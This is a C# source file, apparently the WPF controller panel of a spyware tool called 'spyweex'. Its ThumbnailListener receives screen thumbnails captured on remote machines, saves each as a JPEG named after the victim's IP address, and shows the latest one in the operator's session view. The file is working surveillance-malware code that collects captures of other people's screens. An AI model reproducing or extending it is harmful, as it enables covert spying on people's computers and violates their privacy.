using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media.Imaging;

namespace spyweex_client_wpf.Subscribers
{

    public class ThumbnailListener : ISubscriber
    {
        public void Subscribe(WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(Scheduler.CurrentThread).
                SkipWhile(
                    response =>
                    {
                        if (response.Action.Equals(StaticStrings.ACTION_TYPE.THUMBNAIL_SCREEN_REPORT))
                            return false; // if equals is true then breaks the skipping
                        else if (response.Action.Equals(StaticStrings.ACTION_TYPE.THUMBNAIL_SCREEN_STOP))
                            return false; // if equals is true then breaks the skipping
                        else return true;
                    }
                ).
                Subscribe(
                    response =>
                    {
                        Response resp = (Response)response;
                        using (MemoryStream byteStream = new MemoryStream(resp.content))
                        {
                            try
                            {
                                BitmapImage bi = new BitmapImage();
                                bi.BeginInit();
                                bi.CacheOption = BitmapCacheOption.OnLoad;
                                bi.StreamSource = byteStream;
                                bi.EndInit();
                                bi.Freeze();
                                JpegBitmapEncoder encoder = new JpegBitmapEncoder();
                                Guid photoID = System.Guid.NewGuid();
                                // File name like: Current_Thumbnail_154.124.1.44.jpg 
                                String photolocation = "Current_Thumbnail_" + 
                                    wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString().Split(':')[0] + ".jpg";

                                // update thumbnail
                                BitmapFrame biFrame = BitmapFrame.Create(bi);
                                // if SelectedSession.WANIP corresponds to the ip of client we've currently received thumbnail
                                if (wxhtpClient._viewModel.SelectedSession.WANIP.ToString().
                                    Equals(wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString()))
                                        wxhtpClient._viewModel.SelectedSession.BiFrame = biFrame; // then update the UI

                                encoder.Frames.Add(biFrame);
                                using (var filestream = new FileStream(photolocation, FileMode.Create))
                                    encoder.Save(filestream);

                                byteStream.Close();
                                Debug.WriteLine("Task Completed");
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine((Exception)ex);
                                MessageBoxResult result = MessageBox.Show("Exception occured in ThumbnailListener while saving file " + (Exception)ex);
                            }

                            // if true then we've received the last thumbnail - we can safely unsubscribe now
                            if (response.Action.Equals(StaticStrings.ACTION_TYPE.THUMBNAIL_SCREEN_STOP))
                                UnsubscribeAsync();
                        }
                    },
                    err =>
                    {
                        Debug.WriteLine((Exception)err);
                        MessageBoxResult result = MessageBox.Show("Error occured in ThumbnailListener " + (Exception)err);
                        //UnsubscribeAsync();
                    }
                );
            subscriberToken = idisp;
        }
    }
}
